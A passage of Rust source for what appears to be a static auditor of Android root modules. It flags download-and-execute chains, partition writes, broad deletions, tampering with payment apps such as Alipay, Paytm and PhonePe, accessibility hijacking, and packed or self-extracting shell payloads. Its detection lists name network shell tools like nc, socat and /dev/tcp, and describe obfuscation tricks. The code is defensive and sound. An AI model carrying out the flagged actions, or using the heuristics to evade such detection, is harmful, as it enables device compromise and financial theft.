                current_dir = resolve_path(target, &variables, &current_dir);
            }

            if shell_network_evidence(&name, &args, raw_line).is_some()
                && let Some(target) = downloaded_output_path(&name, &args)
            {
                let target = resolve_path(&target, &variables, &current_dir);
                if !target.is_empty() && !contains_unresolved_variable(&target) {
                    downloaded.insert(target, (line, raw_line.trim().to_owned()));
                }
            }

            let Some(operand) = invoked_script_operand(command, &variables) else {
                continue;
            };
            let target = resolve_path(&operand, &variables, &current_dir);
            let Some((download_line, download_evidence)) = downloaded.get(&target) else {
                continue;
            };
            add_finding(
                state,
                artifact,
                RULE_REMOTE_EXECUTION,
                Severity::Critical,
                Some(line),
                if is_persistent_script_target(&artifact.path) {
                    "Persistent root script downloads and executes remote code"
                } else {
                    "Privileged installer downloads and executes remote code"
                },
                &format!(
                    "line {download_line}: {download_evidence}; line {line}: {} => {target}",
                    raw_line.trim()
                ),
            );
        }
    }
}

fn heredoc_body_lines(text: &str) -> BTreeSet<usize> {
    let lines = physical_lines(text);
    let mut body_lines = BTreeSet::new();
    let mut index = 0;
    while index < lines.len() {
        let tokens = shell_tokens(&lines[index]);
        let Some(delimiter_index) = tokens.iter().position(|token| token == "<<") else {
            index += 1;
            continue;
        };
        let Some(delimiter) = tokens.get(delimiter_index + 1) else {
            index += 1;
            continue;
        };
        let delimiter = delimiter.trim_start_matches('-');
        let mut cursor = index + 1;
        while cursor < lines.len() {
            if lines[cursor].trim_start_matches('\t') == delimiter {
                break;
            }
            body_lines.insert(cursor + 1);
            cursor += 1;
        }
        index = cursor.saturating_add(1);
    }
    body_lines
}

fn downloaded_output_path(name: &str, args: &[String]) -> Option<String> {
    match name {
        "curl" => option_value(args, &["-o", "--output"], &["--output="]),
        "wget" => option_value(args, &["-O", "--output-document"], &["--output-document="]),
        "aria2c" => {
            let output = option_value(args, &["-o", "--out"], &["--out="])?;
            let directory = option_value(args, &["-d", "--dir"], &["--dir="]);
            Some(directory.map_or(output.clone(), |directory| {
                format!("{}/{output}", directory.trim_end_matches('/'))
            }))
        }
        _ => None,
    }
}

fn option_value(args: &[String], separate: &[&str], attached: &[&str]) -> Option<String> {
    for (index, arg) in args.iter().enumerate() {
        if separate.contains(&arg.as_str()) {
            return args.get(index + 1).cloned();
        }
        if let Some(value) = attached
            .iter()
            .find_map(|prefix| arg.strip_prefix(prefix).filter(|value| !value.is_empty()))
        {
            return Some(value.to_owned());
        }
    }
    None
}

fn shell_network_evidence(name: &str, args: &[String], raw_line: &str) -> Option<String> {
    if raw_line.contains("/dev/tcp/") || raw_line.contains("/dev/udp/") {
        return Some(raw_line.trim().to_owned());
    }
    let explicit_remote = args.iter().any(|arg| {
        let lower = arg.to_ascii_lowercase();
        [
            "http://", "https://", "ftp://", "ftps://", "sftp://", "ssh://", "git://",
        ]
        .iter()
        .any(|scheme| lower.contains(scheme))
    });
    if explicit_remote {
        return Some(raw_line.trim().to_owned());
    }
    if matches!(name, "curl" | "wget" | "aria2c") {
        let local_only = args.iter().any(|arg| arg.starts_with("file://"));
        let has_operand = args
            .iter()
            .any(|arg| !arg.starts_with('-') && !arg.is_empty());
        return (has_operand && !local_only).then(|| raw_line.trim().to_owned());
    }
    if name == "git" {
        return args
            .first()
            .is_some_and(|subcommand| {
                matches!(
                    subcommand.as_str(),
                    "clone" | "fetch" | "pull" | "push" | "ls-remote"
                ) || subcommand == "submodule" && args.get(1).is_some_and(|arg| arg == "update")
            })
            .then(|| raw_line.trim().to_owned());
    }
    if matches!(
        name,
        "nc" | "ncat"
            | "netcat"
            | "socat"
            | "ssh"
            | "scp"
            | "sftp"
            | "ftp"
            | "tftp"
            | "ping"
            | "nslookup"
            | "dig"
    ) && args.iter().any(|arg| !arg.starts_with('-'))
    {
        return Some(raw_line.trim().to_owned());
    }
    None
}

fn analyze_financial_modification(
    artifact: &Artifact,
    line: usize,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    state: &mut ScanState,
) {
    let operands: Vec<_> = operands_before_redirection(args)
        .into_iter()
        .filter(|arg| !arg.starts_with('-'))
        .cloned()
        .collect();
    let mut targets = Vec::new();

    match name {
        "rm" | "unlink" | "rmdir" | "shred" | "touch" | "mkdir" | "truncate" | "fallocate"
        | "chmod" | "chown" | "chgrp" | "chcon" | "setfattr" | "patch" | "tee" => {
            targets.extend(operands)
        }
        "cp" | "install" => targets.extend(operands.last().cloned()),
        // mv removes the source as well as replacing the destination.
        "mv" => targets.extend(operands),
        "dd" => targets.extend(
            args.iter()
                .filter_map(|arg| arg.strip_prefix("of="))
                .map(ToOwned::to_owned),
        ),
        "sed" if args.iter().any(|arg| arg == "-i" || arg.starts_with("-i")) => {
            targets.extend(operands)
        }
        "perl"
            if args.iter().any(|arg| {
                arg.starts_with('-') && arg[1..].contains('i') && arg[1..].contains('p')
            }) =>
        {
            targets.extend(operands)
        }
        "sqlite3" if contains_sql_mutation(args) => targets.extend(args.iter().cloned()),
        "pm" if args.first().is_some_and(|arg| {
            matches!(
                arg.as_str(),
                "clear" | "uninstall" | "disable" | "disable-user" | "enable" | "install-existing"
            )
        }) =>
        {
            targets.extend(args.iter().skip(1).cloned())
        }
        "cmd"
            if args.first().is_some_and(|arg| arg == "package")
                && args.get(1).is_some_and(|arg| {
                    matches!(
                        arg.as_str(),
                        "clear"
                            | "uninstall"
                            | "disable"
                            | "disable-user"
                            | "enable"
                            | "install-existing"
                    )
                }) =>
        {
            targets.extend(args.iter().skip(2).cloned())
        }
        "appops"
            if args
                .first()
                .is_some_and(|arg| matches!(arg.as_str(), "set" | "reset")) =>
        {
            targets.extend(args.iter().skip(1).cloned())
        }
        "mount"
            if args
                .iter()
                .any(|arg| matches!(arg.as_str(), "--bind" | "-o")) =>
        {
            targets.extend(operands.last().cloned())
        }
        _ => {
            let bundled_binary = state
                .binary_profiles
                .iter()
                .any(|profile| profile.basename == name);
            if bundled_binary && args.iter().any(|arg| is_binary_mutation_argument(arg)) {
                targets.extend(args.iter().cloned());
            }
        }
    }

    for window in args.windows(2) {
        if matches!(window[0].as_str(), ">" | ">>") {
            targets.push(window[1].clone());
        }
    }

    let Some((target, marker)) = targets.into_iter().find_map(|target| {
        let expanded = expand_variables(&target, variables);
        let resolved = if expanded.contains('/') {
            resolve_path(&expanded, variables, current_dir)
        } else {
            expanded
        };
        financial_target_marker(&resolved).map(|marker| (resolved, marker))
    }) else {
        return;
    };

    add_finding(
        state,
        artifact,
        RULE_FINANCIAL_SCRIPT_MODIFICATION,
        Severity::Critical,
        Some(line),
        "Financial application data or state modification",
        &format!("{name} targets {target} ({marker})"),
    );
}

fn analyze_privileged_package_actions(
    artifact: &Artifact,
    line: usize,
    name: &str,
    args: &[String],
    state: &mut ScanState,
) {
    let command = std::iter::once(name)
        .chain(args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ");
    let lower = command.to_ascii_lowercase();

    let installs_apk = name == "pm"
        && args.first().is_some_and(|arg| {
            arg == "install" || arg.starts_with("install-") && arg != "install-existing"
        })
        || name == "cmd"
            && args.first().is_some_and(|arg| arg == "package")
            && args.get(1).is_some_and(|arg| {
                arg == "install" || arg.starts_with("install-") && arg != "install-existing"
            });
    if installs_apk {
        add_finding(
            state,
            artifact,
            RULE_APK_INSTALL,
            Severity::High,
            Some(line),
            "Module installs an Android application",
            &abbreviated_evidence(&command),
        );
    }

    let grants_permission = name == "pm" && args.first().is_some_and(|arg| arg == "grant")
        || name == "cmd"
            && args.first().is_some_and(|arg| arg == "package")
            && args
                .get(1)
                .is_some_and(|arg| matches!(arg.as_str(), "grant-runtime-permission" | "grant"));
    if grants_permission && contains_sensitive_android_permission(&lower) {
        add_finding(
            state,
            artifact,
            RULE_PRIVILEGED_PERMISSION_GRANT,
            Severity::Critical,
            Some(line),
            "Module grants a highly sensitive Android permission",
            &abbreviated_evidence(&command),
        );
    }

    if let Some(severity) = accessibility_settings_mutation_severity(name, args, &lower) {
        add_finding(
            state,
            artifact,
            RULE_ACCESSIBILITY_HIJACK,
            severity,
            Some(line),
            if severity == Severity::Critical {
                "Module selects enabled accessibility services"
            } else {
                "Module changes the accessibility master switch"
            },
            &abbreviated_evidence(&command),
        );
    }
}

fn contains_sensitive_android_permission(command: &str) -> bool {
    [
        "android.permission.write_secure_settings",
        "android.permission.read_sms",
        "android.permission.receive_sms",
        "android.permission.read_call_log",
        "android.permission.read_contacts",
    ]
    .iter()
    .any(|permission| command.contains(permission))
}

fn accessibility_settings_mutation_severity(
    name: &str,
    args: &[String],
    lower: &str,
) -> Option<Severity> {
    let mut settings_args = args;
    if name == "cmd" && args.first().is_some_and(|arg| arg == "settings") {
        settings_args = &args[1..];
    } else if name != "settings" {
        settings_args = &[];
    }
    let settings_mutation = if settings_args.iter().any(|arg| arg == "put")
        && settings_args.iter().any(|arg| arg == "secure")
    {
        settings_args.iter().enumerate().find_map(|(index, arg)| {
            let key = arg.to_ascii_lowercase();
            let value = settings_args
                .get(index + 1)
                .map(|value| value.to_ascii_lowercase())
                .unwrap_or_default();
            match key.as_str() {
                "enabled_accessibility_services"
                    if !value.is_empty() && !matches!(value.as_str(), "null" | "none") =>
                {
                    Some(Severity::Critical)
                }
                "accessibility_enabled" if !matches!(value.as_str(), "" | "0" | "false") => {
                    Some(Severity::High)
                }
                _ => None,
            }
        })
    } else {
        None
    };
    if settings_mutation.is_some() {
        return settings_mutation;
    }

    let content_provider_mutation = name == "content"
        && args
            .first()
            .is_some_and(|arg| matches!(arg.as_str(), "insert" | "update"))
        && lower.contains("settings/secure");
    if content_provider_mutation && lower.contains("enabled_accessibility_services") {
        return Some(Severity::Critical);
    }
    if content_provider_mutation
        && lower.contains("accessibility_enabled")
        && !content_binding_is_false(lower)
    {
        return Some(Severity::High);
    }

    let direct_database_mutation = matches!(name, "sqlite3" | "sed" | "perl")
        && (lower.contains("enabled_accessibility_services")
            || lower.contains("accessibility_enabled"))
        && (contains_sql_mutation(args)
            || name == "sed" && args.iter().any(|arg| arg == "-i" || arg.starts_with("-i"))
            || name == "perl"
                && args.iter().any(|arg| {
                    arg.starts_with('-') && arg[1..].contains('i') && arg[1..].contains('p')
                }));
    if direct_database_mutation && lower.contains("enabled_accessibility_services") {
        Some(Severity::Critical)
    } else if direct_database_mutation {
        Some(Severity::High)
    } else {
        None
    }
}

fn content_binding_is_false(command: &str) -> bool {
    ["value:s:0", "value:i:0", "value:s:false", "value:b:false"]
        .iter()
        .any(|binding| command.contains(binding))
}

fn contains_sql_mutation(args: &[String]) -> bool {
    let sql = args.join(" ").to_ascii_lowercase();
    [
        "update ", "insert ", "delete ", "replace ", "drop ", "alter ",
    ]
    .iter()
    .any(|keyword| sql.contains(keyword))
}

fn is_binary_mutation_argument(argument: &str) -> bool {
    let argument = argument
        .trim_start_matches('-')
        .to_ascii_lowercase()
        .replace('_', "-");
    [
        "patch", "write", "delete", "remove", "inject", "hook", "replace", "disable", "clear",
        "modify", "tamper",
    ]
    .iter()
    .any(|verb| argument == *verb || argument.starts_with(&format!("{verb}=")))
}

fn financial_target_marker(value: &str) -> Option<String> {
    if let Some(marker) = financial_package_marker(value) {
        return Some(marker);
    }
    let lower = value.to_ascii_lowercase();
    for (brand, label) in [
        ("alipay", "Alipay"),
        ("wechat", "WeChat"),
        ("weixin", "WeChat"),
        ("phonepe", "PhonePe"),
        ("paytm", "Paytm"),
        ("googlepay", "Google Pay"),
        ("gpay", "Google Pay"),
        ("mobikwik", "MobiKwik"),
        ("freecharge", "Freecharge"),
    ] {
        if contains_word(&lower, brand) {
            return Some(label.to_owned());
        }
    }
    lower.contains("upi://").then(|| "UPI".to_owned())
}

fn financial_package_marker(value: &str) -> Option<String> {
    const KNOWN_PACKAGES: &[(&str, &str)] = &[
        ("com.eg.android.alipaygphone", "Alipay"),
        ("com.tencent.mm", "WeChat"),
        ("in.org.npci.upiapp", "BHIM/UPI"),
        ("com.google.android.apps.nbu.paisa.user", "Google Pay India"),
        ("com.phonepe.app", "PhonePe"),
        ("net.one97.paytm", "Paytm"),
        ("com.mobikwik_new", "MobiKwik"),
        ("com.freecharge.android", "Freecharge"),
    ];
    let lower = value.to_ascii_lowercase();
    if let Some((_, label)) = KNOWN_PACKAGES
        .iter()
        .find(|(package, _)| contains_word(&lower, package))
    {
        return Some((*label).to_owned());
    }
    for token in lower.split(|character: char| {
        !character.is_ascii_alphanumeric() && character != '.' && character != '_'
    }) {
        let token = token.trim_matches('.');
        if token.matches('.').count() < 2 {
            continue;
        }
        if token.split('.').any(|segment| {
            matches!(
                segment,
                "bank"
                    | "banking"
                    | "mobilebank"
                    | "mobilebanking"
                    | "wallet"
                    | "payment"
                    | "payments"
                    | "finance"
                    | "financial"
                    | "upi"
                    | "bhim"
                    | "npci"
            )
        }) {
            return Some(format!("financial package {token}"));
        }
    }
    None
}

fn contains_word(text: &str, needle: &str) -> bool {
    text.match_indices(needle).any(|(index, _)| {
        let before = text[..index].chars().next_back();
        let after = text[index + needle.len()..].chars().next();
        before.is_none_or(|value| !value.is_ascii_alphanumeric())
            && after.is_none_or(|value| !value.is_ascii_alphanumeric())
    })
}

#[allow(clippy::too_many_arguments)]
fn analyze_delete(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    module_id: Option<&str>,
    state: &mut ScanState,
) {
    if !matches!(name, "rm" | "unlink" | "rmdir" | "shred") {
        return;
    }
    let targets: Vec<_> = operands_before_redirection(args)
        .into_iter()
        .filter(|arg| !arg.starts_with('-'))
        .map(|arg| resolve_path(arg, variables, current_dir))
        .filter(|target| !target.is_empty())
        .collect();
    if targets.is_empty() {
        return;
    }
    for target in targets {
        let (rule, severity, title) = if is_module_owned(&target, module_id) {
            (RULE_OWN_DELETE, Severity::Info, "Module-owned deletion")
        } else if is_broad_delete(&target) {
            (
                RULE_BROAD_DELETE,
                Severity::Critical,
                "Broad destructive deletion",
            )
        } else if contains_unresolved_variable(&target) {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion target cannot be resolved",
            )
        } else {
            (
                RULE_UNKNOWN_DELETE,
                Severity::High,
                "Deletion outside the module directory",
            )
        };
        add_finding(
            state,
            artifact,
            rule,
            severity,
            Some(line),
            title,
            &format!("{} => {target}", raw_line.trim()),
        );
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_writes(
    artifact: &Artifact,
    line: usize,
    raw_line: &str,
    name: &str,
    args: &[String],
    variables: &BTreeMap<String, String>,
    current_dir: &str,
    state: &mut ScanState,
) {
    let mut targets = Vec::new();
    let mut found_block_target = false;
    if name == "dd" {
        targets.extend(
            args.iter()
                .filter_map(|arg| arg.strip_prefix("of="))
                .map(ToOwned::to_owned),
        );
    }
    if is_destructive_writer(name) {
        let operands: Vec<_> = operands_before_redirection(args)
            .into_iter()
            .filter(|arg| !arg.starts_with('-'))
            .cloned()
            .collect();
        if matches!(name, "cp" | "mv") {
            targets.extend(operands.last().cloned());
        } else {
            targets.extend(operands);
        }
    }
    for window in args.windows(2) {
        if matches!(window[0].as_str(), ">" | ">>") {
            targets.push(window[1].clone());
        }
    }

    for target in targets {
        let resolved = resolve_path(&target, variables, current_dir);
        if is_block_device_path(&resolved) {
            found_block_target = true;
            add_finding(
                state,
                artifact,
                RULE_PARTITION_WRITE,
                Severity::Critical,
                Some(line),
                "Partition or block-device write",
                &format!("{} => {resolved}", raw_line.trim()),
            );
        } else if contains_unresolved_variable(&resolved)
            && (name == "dd" || is_destructive_writer(name))
        {
            add_finding(
                state,
                artifact,
                RULE_DESTRUCTIVE_WRITE_UNKNOWN,
                Severity::High,
                Some(line),
                "Destructive write target cannot be resolved",
                raw_line.trim(),
            );
        }
    }
    if is_flash_writer(name) && !found_block_target {
        add_finding(
            state,
            artifact,
            RULE_FLASH_TOOL,
            Severity::High,
            Some(line),
            "Partition flashing or erasure tool",
            raw_line.trim(),
        );
    }
}

fn correlate_binary_execution(state: &mut ScanState) {
    let binaries = state.binaries.clone();
    let scripts = state.scripts.clone();
    for binary in binaries {
        let basename = posix_basename(&binary);
        for (script_path, text, provenance) in &scripts {
            for (index, line) in text.lines().enumerate() {
                if line_executes_binary(line, basename) {
                    state.findings.push(Finding {
                        rule_id: RULE_BINARY_EXECUTED.to_owned(),
                        severity: Severity::Notice,
                        path: script_path.clone(),
                        line: Some(index + 1),
                        title: "Precompiled binary is executed or loaded".to_owned(),
                        evidence: format!("{} executes {binary}", line.trim()),
                        provenance: provenance.clone(),
                    });
                }
            }
        }
    }
}

fn line_executes_binary(line: &str, basename: &str) -> bool {
    if basename.len() <= 2 {
        return false;
    }
    let tokens = shell_tokens(line);
    split_commands(&tokens).into_iter().any(|command| {
        let (name, _) = normalize_command(command);
        name == basename
    })
}

fn add_finding(
    state: &mut ScanState,
    artifact: &Artifact,
    rule_id: &str,
    severity: Severity,
    line: Option<usize>,
    title: &str,
    evidence: &str,
) {
    state.findings.push(Finding {
        rule_id: rule_id.to_owned(),
        severity,
        path: artifact.path.clone(),
        line,
        title: title.to_owned(),
        evidence: evidence.to_owned(),
        provenance: artifact.provenance.clone(),
    });
}

fn analyze_self_indexed_generated_scripts(
    artifact: &Artifact,
    text: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if !text.contains("$0") || !text.contains("cut -c") || !text.contains("sed -n") {
        return;
    }
    let (source_path, source_bytes) = indexed_character_source(artifact, state);
    let source_text = String::from_utf8_lossy(&source_bytes);
    let source_lines = physical_lines(&source_text);
    let mut variables = predefined_variables(module_id);
    let mut recovered = 0_usize;
    for line in physical_lines(text) {
        let Some((name, source_line, column)) = parse_self_index_assignment(&line) else {
            continue;
        };
        let Some(value) = source_lines
            .get(source_line.saturating_sub(1))
            .and_then(|line| line.chars().nth(column.saturating_sub(1)))
        else {
            continue;
        };
        variables.insert(name, value.to_string());
        recovered += 1;
    }
    if recovered == 0 {
        return;
    }

    for (line, target, content) in extract_static_echo_redirects(text, &variables) {
        let target = resolve_path(&target, &variables, "$CWD");
        if contains_unresolved_variable(&target)
            || !generated_target_is_invoked(text, &target, &variables)
        {
            continue;
        }
        let content = expand_variables(&content, &variables);
        if content.contains('$') || content.is_empty() {
            add_finding(
                state,
                artifact,
                RULE_UNAUDITABLE_DECODER,
                Severity::High,
                Some(line),
                "Self-indexed generated script cannot be fully reconstructed",
                &format!(
                    "recovered {recovered} character variables from {source_path}; output {target} is executed"
                ),
            );
            continue;
        }
        add_finding(
            state,
            artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(line),
            "Self-indexed shell payload reconstructed",
            &format!(
                "recovered {recovered} character variables from {source_path}; generated {target} is executed"
            ),
        );
        scan_derived_bytes(
            artifact.clone(),
            content.into_bytes(),
            "self-indexed generated script",
            module_id,
            config,
            state,
        );
    }
}

fn indexed_character_source(artifact: &Artifact, state: &ScanState) -> (String, Vec<u8>) {
    if posix_basename(&artifact.path) == "install.sh"
        && let Some((path, bytes)) = state.archive_files.iter().find(|(path, _)| {
            path.as_str() == "META-INF/com/google/android/update-binary"
                || path.ends_with("/META-INF/com/google/android/update-binary")
        })
    {
        return (path.clone(), bytes.clone());
    }
    (artifact.path.clone(), artifact.bytes.clone())
}

fn parse_self_index_assignment(line: &str) -> Option<(String, usize, usize)> {
    let trimmed = line.trim();
    let (name, expression) = trimmed.split_once("=$(")?;
    if !is_variable_name(name.trim()) || !expression.contains("$0") {
        return None;
    }
    let sed = expression.split_once("sed -n")?.1.trim_start();
    let sed = sed.strip_prefix('\'').or_else(|| sed.strip_prefix('"'))?;
    let source_line: usize = sed
        .chars()
        .take_while(char::is_ascii_digit)
        .collect::<String>()
        .parse()
        .ok()?;
    let cut = expression.split_once("cut -c")?.1.trim_start();
    let column: usize = cut
        .chars()
        .take_while(char::is_ascii_digit)
        .collect::<String>()
        .parse()
        .ok()?;
    Some((name.trim().to_owned(), source_line, column))
}

fn extract_static_echo_redirects(
    text: &str,
    variables: &BTreeMap<String, String>,
) -> Vec<(usize, String, String)> {
    let mut output = Vec::new();
    let mut search_from = 0;
    while let Some(relative) = text[search_from..].find("echo -n") {
        let start = search_from + relative;
        let mut cursor = start + "echo -n".len();
        while text
            .as_bytes()
            .get(cursor)
            .is_some_and(u8::is_ascii_whitespace)
        {
            cursor += 1;
        }
        if text.as_bytes().get(cursor) != Some(&b'"') {
            search_from = cursor;
            continue;
        }
        let content_start = cursor + 1;
        cursor = content_start;
        let mut escaped = false;
        let mut matched = None;
        while cursor < text.len() {
            let byte = text.as_bytes()[cursor];
            if escaped {
                escaped = false;
                cursor += 1;
                continue;
            }
            if byte == b'\\' {
                escaped = true;
                cursor += 1;
                continue;
            }
            if byte == b'"' {
                let suffix = text[cursor + 1..].trim_start_matches([' ', '\t', '\r', '\n']);
                if let Some(after_redirect) = suffix.strip_prefix('>') {
                    let target = after_redirect.split_whitespace().next().unwrap_or_default();
                    if !target.is_empty() {
                        matched = Some((cursor, target.to_owned()));
                        break;
                    }
                }
            }
            cursor += 1;
        }
        let Some((content_end, target)) = matched else {
            search_from = content_start;
            continue;
        };
        let content = expand_variables(&text[content_start..content_end], variables);
        let line = physical_lines(&text[..start]).len();
        output.push((line, target, content));
        search_from = content_end + 1;
    }
    output
}

fn generated_target_is_invoked(
    text: &str,
    target: &str,
    variables: &BTreeMap<String, String>,
) -> bool {
    logical_lines(text).iter().any(|line| {
        let tokens = shell_tokens(line);
        split_commands(&tokens).into_iter().any(|command| {
            invoked_script_operand(command, variables)
                .is_some_and(|operand| resolve_path(&operand, variables, "$CWD") == target)
        })
    })
}

fn detect_gzexe(bytes: &[u8], text: &str) -> Option<(usize, String)> {
    if !text.contains("gzip -cd") || !text.contains("tail") {
        return None;
    }
    let lines = physical_lines(text);
    let skip = lines
        .iter()
        .take(64)
        .find_map(|line| parse_literal_tail_start(line))
        .or_else(|| {
            lines.iter().take(64).find_map(|line| {
                line.trim()
                    .strip_prefix("skip=")?
                    .trim_matches(|character: char| character == '\'' || character == '"')
                    .parse::<usize>()
                    .ok()
            })
        })?;
    let offset = line_offset(bytes, skip)?;
    if bytes.get(offset..offset + 2) != Some(&[0x1f, 0x8b]) {
        return None;
    }
    Some((
        offset,
        format!("gzexe-style shell with gzip payload beginning at line {skip}"),
    ))
}

fn parse_literal_tail_start(line: &str) -> Option<usize> {
    if !line.contains("gzip -cd") {
        return None;
    }
    let tail = line.split_once("tail")?.1;
    let after_n = tail.split_once("-n")?.1.trim_start();
    let digits: String = after_n
        .strip_prefix('+')?
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    (!digits.is_empty()).then(|| digits.parse().ok()).flatten()
}

fn detect_embedded_self_extracting_payloads(
    bytes: &[u8],
    text: &str,
) -> Vec<(usize, &'static str)> {
    if !text.contains("$0")
        || !(text.contains("tail ")
            || text.contains("sed ") && text.contains("/d")
            || text.contains("dd ") && text.contains("skip="))
    {
        return Vec::new();
    }
    let mut output = Vec::new();
    if let Some(offset) = bytes
        .windows(4)
        .enumerate()
        .skip(1)
        .find_map(|(offset, window)| (window == b"\x7fELF").then_some(offset))
    {
        output.push((offset, "ELF"));
    }
    if let Some(offset) = bytes
        .windows(2)
        .enumerate()
        .skip(1)
        .find_map(|(offset, window)| (window == [0x1f, 0x8b]).then_some(offset))
    {
        output.push((offset, "gzip"));
    }
    output.sort_unstable();
    output
}

fn line_offset(bytes: &[u8], one_based_line: usize) -> Option<usize> {
    if one_based_line == 0 {
        return None;
    }
    if one_based_line == 1 {
        return Some(0);
    }
    let mut line = 1;
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'\n' || bytes[index] == b'\r' {
            if bytes[index] == b'\r' && bytes.get(index + 1) == Some(&b'\n') {
                index += 1;
            }
            line += 1;
            if line == one_based_line {
                return Some(index + 1);
            }
        }
        index += 1;
    }
    None
}

fn looks_like_shell(path: &str, bytes: &[u8]) -> bool {
    path.ends_with(".sh")
        || is_persistent_script_target(path)
        || bytes.starts_with(b"#!")
        || bytes
            .get(..4096.min(bytes.len()))
            .is_some_and(|head| head.windows(7).any(|window| window == b"#!/bin/"))
}

fn is_apk(path: &str, bytes: &[u8]) -> bool {
    if path.to_ascii_lowercase().ends_with(".apk") {
        return true;
    }
    if !bytes.starts_with(b"PK\x03\x04")
        && !bytes.starts_with(b"PK\x05\x06")
        && !bytes.starts_with(b"PK\x07\x08")
    {
        return false;
    }
    let Ok(mut archive) = zip::ZipArchive::new(Cursor::new(bytes)) else {
        return false;
    };
    let mut has_manifest = false;
    let mut has_apk_payload = false;
    for index in 0..archive.len() {
        let Ok(entry) = archive.by_index(index) else {
            continue;
        };
        match entry.name() {
            "AndroidManifest.xml" => has_manifest = true,
            "resources.arsc" | "classes.dex" => has_apk_payload = true,
            _ => {}
        }
        if has_manifest && has_apk_payload {
            return true;
        }
    }
    false
}

fn is_elf(bytes: &[u8]) -> bool {
    bytes.starts_with(b"\x7fELF")
}

fn describe_elf(bytes: &[u8]) -> String {
    let class = match bytes.get(4) {
        Some(1) => "ELF32",
        Some(2) => "ELF64",
        _ => "ELF",
    };
    let endian = bytes.get(5).copied().unwrap_or(1);
    let kind = bytes
        .get(16..18)
        .map(|pair| {
            if endian == 2 {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .map_or("unknown", |value| match value {
            1 => "relocatable",
            2 => "executable",
            3 => "shared object",
            4 => "core",
            _ => "unknown",
        });
    format!("{class} {kind}")
}

fn binary_network_evidence(bytes: &[u8]) -> Option<String> {
    use goblin::elf::{Elf, header::ET_REL};

    let elf = Elf::parse(bytes).ok()?;
    // Kernel modules and ordinary object files use the same ELF container, but
    // their undefined symbols belong to the kernel/linker namespace. Applying
    // userspace libc semantics to them produces false positives such as BPF
    // connect hooks and connector infrastructure.
    if elf.header.e_type == ET_REL {
        return None;
    }

    let imports: BTreeSet<_> = elf
        .dynsyms
        .iter()
        .filter(|symbol| symbol.is_import())
        .filter_map(|symbol| elf.dynstrtab.get_at(symbol.st_name))
        .map(strip_elf_symbol_version)
        .collect();
    let libraries: BTreeSet<_> = elf
        .libraries
        .iter()
        .map(|library| library.to_ascii_lowercase())
        .collect();

    network_evidence_from_elf_metadata(&imports, &libraries)
}

fn network_evidence_from_elf_metadata(
    imports: &BTreeSet<&str>,
    libraries: &BTreeSet<String>,
) -> Option<String> {
    if let Some(symbol) = [
        "curl_easy_perform",
        "curl_multi_perform",
        "wget_main",
        "SSL_connect",
        "BIO_do_connect",
        "nghttp2_session_client_new",
    ]
    .into_iter()
    .find(|symbol| imports.contains(symbol))
    {
        return Some(format!(
            "imports network-client API {symbol}; static analysis cannot prove when or where it connects"
        ));
    }
    if libraries
        .iter()
        .any(|library| library == "libcurl.so" || library.starts_with("libcurl.so."))
    {
        return Some(
            "declares a dynamic dependency on libcurl; static analysis cannot prove when or where it connects"
                .to_owned(),
        );
    }

    let transport = ["connect", "sendto"]
        .into_iter()
        .find(|symbol| imports.contains(symbol));
    let addressing = [
        "getaddrinfo",
        "gethostbyname",
        "gethostbyname2",
        "inet_aton",
        "inet_pton",
    ]
    .into_iter()
    .find(|symbol| imports.contains(symbol));
    match (transport, addressing) {
        (Some(transport), Some(addressing)) => Some(format!(
            "imports {transport} together with Internet address resolver/conversion API {addressing}; static analysis cannot prove when or where it connects"
        )),
        _ => None,
    }
}

fn strip_elf_symbol_version(symbol: &str) -> &str {
    symbol.split_once('@').map_or(symbol, |(name, _)| name)
}

fn contains_accessibility_service_declaration(bytes: &[u8]) -> bool {
    let strings = extract_binary_strings(bytes);
    let has_binding_permission = strings.iter().any(|value| {
        value
            .to_ascii_lowercase()
            .contains("android.permission.bind_accessibility_service")
    });
    let has_service_action = strings.iter().any(|value| {
        value
            .to_ascii_lowercase()
            .contains("android.accessibilityservice.accessibilityservice")
    });
    has_binding_permission && has_service_action
}

fn compiled_financial_accessibility_evidence(bytes: &[u8]) -> Option<String> {
    let strings = extract_binary_strings(bytes);
    let (_, financial_marker) = strings
        .iter()
        .find_map(|value| financial_package_marker(value).map(|marker| (value, marker)))?;
    let accessibility = strings.iter().find(|value| {
        let lower = value.to_ascii_lowercase();
        lower.contains("accessibilityservice") || lower.contains("accessibilitynodeinfo")
    })?;
    let control = strings.iter().find(|value| {
        let lower = value.to_ascii_lowercase();
        [
            "dispatchgesture",
            "performaction",
            "performglobalaction",
            "action_click",
            "action_set_text",
            "findaccessibilitynodeinfosbytext",
        ]
        .iter()
        .any(|marker| lower.contains(marker))
    })?;
    Some(format!(
        "targets {financial_marker}; accessibility API {}; control primitive {}",
        abbreviated_evidence(accessibility),
        abbreviated_evidence(control)
    ))
}

fn binary_financial_modification_evidence(bytes: &[u8]) -> Option<(Severity, String)> {
    let strings = extract_binary_strings(bytes);
    if let Some((value, marker)) = strings.iter().find_map(|value| {
        let marker = financial_target_marker(value)?;
        contains_strong_binary_mutation(value).then_some((value, marker))
    }) {
        return Some((
            Severity::Critical,
            format!(
                "embedded command combines {} with modification semantics: {}",
                marker,
                abbreviated_evidence(value)
            ),
        ));
    }

    let financial = strings.iter().find_map(|value| {
        if !is_sensitive_financial_data_path(value) {
            return None;
        }
        financial_target_marker(value).map(|marker| (value, marker))
    })?;
    let mutation = strings
        .iter()
        .find(|value| contains_strong_binary_mutation(value))?;
    Some((
        Severity::High,
        format!(
            "contains target {} ({}) and a separate modification-capability marker {}; no static call relationship was proven",
            abbreviated_evidence(financial.0),
            financial.1,
            abbreviated_evidence(mutation)
        ),
    ))
}

fn contains_strong_binary_mutation(value: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    [
        "process_vm_writev",
        "unlinkat",
        "unlink",
        "renameat",
        "rename",
        "setxattr",
        "chmod",
